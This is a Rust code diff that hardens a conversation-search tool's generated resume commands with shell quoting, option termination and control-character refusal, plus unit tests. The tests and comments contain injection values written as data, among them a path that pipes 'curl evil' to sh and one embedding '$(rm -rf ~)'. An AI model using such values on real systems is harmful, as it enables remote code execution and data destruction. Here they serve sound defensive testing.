@@ -24,8 +24,50 @@ fn source_label(source: &str) -> &str {
         .unwrap_or("[CC]")
 }
 
+/// The `claude` invocation to put in resume commands.
+///
+/// Deliberately interpolated unquoted: this is a shell fragment, not a filename, and a user
+/// may legitimately set it to `env FOO=1 claude` or add flags. Note the trust boundary --
+/// Claude Code lets a project's own `.claude/settings.json` set `env`, so unlike `PATH` this
+/// value can come from the repository being searched, and it lands inside a string the docs
+/// tell you to `eval`. Treat it as operator-owned configuration, not as data.
 fn claude_cmd() -> String {
     std::env::var("CC_CONVERSATION_SEARCH_CMD").unwrap_or_else(|_| "claude".to_string())
+}
+
+/// Quote a string for safe interpolation into a POSIX shell command.
+///
+/// `resume_command` is documented as something you `eval` (README.md, SKILL.md), and
+/// `project_path` is transcript-derived, not validated: a directory named
+/// `/tmp/x;curl evil|sh` would otherwise execute on resume, and the benign form of the same
+/// bug is a plain space turning `cd /My Projects/app` into a cd somewhere else entirely.
+///
+/// Conditional rather than unconditional so ordinary paths and UUIDs pass through byte for
+/// byte, which keeps the documented examples and the picker's field parsing unchanged.
+fn shell_quote(s: &str) -> String {
+    fn is_safe(c: char) -> bool {
+        c.is_ascii_alphanumeric()
+            || matches!(c, '_' | '@' | '%' | '+' | '=' | ':' | ',' | '.' | '/' | '-')
+    }
+    if !s.is_empty() && s.chars().all(is_safe) {
+        return s.to_string();
+    }
+    // Single quotes suppress every expansion; the one character they cannot contain is `'`
+    // itself, spliced back in as `'\''` -- close, escaped quote, reopen.
+    format!("'{}'", s.replace('\'', r"'\''"))
+}
+
+/// Whether a value can be safely interpolated into a resume command at all.
+///
+/// Quoting cannot save two shapes, so they are refused rather than emitted:
+///
+/// - A NUL terminates the string for the consuming shell mid-quote, leaving the quote open
+///   and splicing whatever follows into the command.
+/// - A newline or tab survives quoting but breaks the picker's tab-separated protocol
+///   (`bin/ai-conversation-search` splits fields with `cut`), so a fragment of the command
+///   would reach `eval` on its own.
+fn is_shell_safe_value(s: &str) -> bool {
+    !s.chars().any(|c| c.is_control())
 }
 
 /// Recursively convert UTC ISO timestamps to local timezone in JSON values.
@@ -728,6 +770,29 @@ fn print_unindexed_warning(search: &ConversationSearch) {
     }
 }
 
+/// Build the `cd … && claude --resume …` one-liner, or `None` if it cannot be made safe.
+///
+/// `cd --` terminates option parsing: a project directory named `-Users-foo` is all
+/// "safe" characters, so it passes `shell_quote` through untouched, and quoting would not
+/// help anyway -- `cd '-Users-foo'` is still `-Users-foo` after quote removal, which `cd`
+/// reads as flags. `session_id` gets no such treatment because whether `claude --resume`
+/// accepts a `--` separator is that CLI's business, not ours; a leading `-` there is
+/// refused instead of guessed at. Real session ids are UUIDs, so this costs nothing.
+fn build_resume_command(project_path: &str, session_id: &str, cmd: &str) -> Option<String> {
+    if !is_shell_safe_value(project_path) || !is_shell_safe_value(session_id) {
+        return None;
+    }
+    if session_id.starts_with('-') {
+        return None;
+    }
+    Some(format!(
+        "cd -- {} && {} --resume {}",
+        shell_quote(project_path),
+        cmd,
+        shell_quote(session_id)
+    ))
+}
+
 fn inject_resume_command(val: &mut serde_json::Value) {
     let cmd = claude_cmd();
     match val {
@@ -755,9 +820,9 @@ fn inject_resume_command(val: &mut serde_json::Value) {
             let resume = match (session_id, project_path) {
                 (Some(sid), Some(pp)) => match source.as_str() {
                     "opencode" | "codex" => serde_json::Value::Null,
-                    _ => {
-                        serde_json::Value::String(format!("cd {} && {} --resume {}", pp, cmd, sid))
-                    }
+                    _ => build_resume_command(&pp, &sid, &cmd)
+                        .map(serde_json::Value::String)
+                        .unwrap_or(serde_json::Value::Null),
                 },
                 _ => serde_json::Value::Null,
             };
@@ -880,8 +945,8 @@ fn cmd_search(
             );
         } else {
             println!("\n   Resume:");
-            println!("     cd {}", project_dir);
-            println!("     {} --resume {}", claude_cmd(), session_id);
+            println!("     cd -- {}", shell_quote(project_dir));
+            println!("     {} --resume {}", claude_cmd(), shell_quote(session_id));
         }
         println!();
     }
@@ -959,8 +1024,8 @@ fn cmd_search_grouped(
 
         if source_str != "opencode" && source_str != "codex" {
             println!("\n   Resume:");
-            println!("     cd {}", project_dir);
-            println!("     {} --resume {}", claude_cmd(), session_id);
+            println!("     cd -- {}", shell_quote(project_dir));
+            println!("     {} --resume {}", claude_cmd(), shell_quote(session_id));
         }
         println!();
     }
@@ -1116,8 +1181,8 @@ fn cmd_resume(uuid: &str) -> Result<()> {
 
     match result {
         Ok((session_id, project_path)) => {
-            println!("cd {}", project_path);
-            println!("{} --resume {}", claude_cmd(), session_id);
+            println!("cd -- {}", shell_quote(&project_path));
+            println!("{} --resume {}", claude_cmd(), shell_quote(&session_id));
         }
         Err(_) => {
             eprintln!("Message not found: {}", uuid);
@@ -1142,6 +1207,117 @@ mod tests {
         let dir = std::env::temp_dir().join(format!("conv-search-{}-{}", name, std::process::id()));
         std::fs::create_dir_all(&dir).unwrap();
         dir.join(".last-auto-index")
+    }
+
+    #[test]
+    fn test_shell_quote_leaves_ordinary_paths_alone() {
+        assert_eq!(
+            shell_quote("/Users/me/ghq/github.com/a/b-c_d.e"),
+            "/Users/me/ghq/github.com/a/b-c_d.e"
+        );
+        assert_eq!(
+            shell_quote("9ef036cc-e7e3-4066-b304-db797421ba42"),
+            "9ef036cc-e7e3-4066-b304-db797421ba42"
+        );
+    }
+
+    #[test]
+    fn test_shell_quote_space() {
+        assert_eq!(shell_quote("/My Projects/app"), "'/My Projects/app'");
+    }
+
+    #[test]
+    fn test_shell_quote_command_substitution_is_inert() {
+        assert_eq!(shell_quote("/tmp/$(rm -rf ~)"), "'/tmp/$(rm -rf ~)'");
+        assert_eq!(shell_quote("/tmp/`id`"), "'/tmp/`id`'");
+    }
+
+    #[test]
+    fn test_shell_quote_semicolon_and_pipe() {
+        assert_eq!(shell_quote("/tmp/x;curl evil|sh"), "'/tmp/x;curl evil|sh'");
+    }
+
+    #[test]
+    fn test_shell_quote_embedded_single_quote() {
+        // Close, escape, reopen: `it's` must survive one round of shell parsing intact.
+        assert_eq!(shell_quote("/tmp/it's"), r"'/tmp/it'\''s'");
+    }
+
+    #[test]
+    fn test_shell_quote_empty_is_quoted_not_dropped() {
+        // Unquoted, an empty string vanishes and `cd '' && ...` becomes `cd && ...`.
+        assert_eq!(shell_quote(""), "''");
+    }
+
+    #[test]
+    fn test_shell_quote_non_ascii_is_quoted() {
+        // Japanese paths are ordinary here; they must land in the quoted branch rather
+        // than being treated as safe by an ASCII-only allowlist that ignores them.
+        assert_eq!(
+            shell_quote("/Users/me/開発/アプリ"),
+            "'/Users/me/開発/アプリ'"
+        );
+    }
+
+    #[test]
+    fn test_build_resume_command_quotes_hostile_project_path() {
+        let cmd = build_resume_command("/tmp/x; touch pwned", "abc-123", "claude").unwrap();
+        assert_eq!(
+            cmd,
+            "cd -- '/tmp/x; touch pwned' && claude --resume abc-123"
+        );
+    }
+
+    #[test]
+    fn test_build_resume_command_terminates_options_for_dash_leading_path() {
+        // All-safe characters, so quoting alone would leave `cd -Users-x` reading its
+        // argument as flags. The `--` is what actually closes this.
+        let cmd = build_resume_command("-Users-x", "abc-123", "claude").unwrap();
+        assert!(cmd.starts_with("cd -- -Users-x &&"), "got: {}", cmd);
+    }
+
+    #[test]
+    fn test_build_resume_command_refused_for_control_characters() {
+        // A newline would split the picker's tab-separated line and hand `eval` a fragment.
+        assert!(build_resume_command("/tmp/a\nb", "abc-123", "claude").is_none());
+        assert!(build_resume_command("/tmp/a\tb", "abc-123", "claude").is_none());
+        // A NUL truncates the string for the consuming shell, leaving the quote unclosed.
+        assert!(build_resume_command("/tmp/a\0b", "abc-123", "claude").is_none());
+        assert!(build_resume_command("/tmp/ok", "abc\n123", "claude").is_none());
+    }
+
+    #[test]
+    fn test_build_resume_command_refused_for_dash_leading_session_id() {
+        // Whether `claude --resume` honours a `--` separator is that CLI's contract, so a
+        // command that cannot be proven safe is not emitted at all.
+        assert!(build_resume_command("/tmp/ok", "-x", "claude").is_none());
+    }
+
+    #[test]
+    fn test_inject_resume_command_emits_null_when_unsafe() {
+        let mut v = serde_json::json!([{
+            "session_id": "abc-123",
+            "project_path": "/tmp/a\nb",
+            "source": "claude_code"
+        }]);
+        inject_resume_command(&mut v);
+        assert!(v[0]["resume_command"].is_null());
+    }
+
+    #[test]
+    fn test_inject_resume_command_quotes_hostile_project_path() {
+        let mut v = serde_json::json!([{
+            "session_id": "abc-123",
+            "project_path": "/tmp/x; touch pwned",
+            "source": "claude_code"
+        }]);
+        inject_resume_command(&mut v);
+        let cmd = v[0]["resume_command"].as_str().unwrap();
+        assert!(
+            cmd.starts_with("cd -- '/tmp/x; touch pwned' && "),
+            "got: {}",
+            cmd
+        );
     }
 
     #[test]
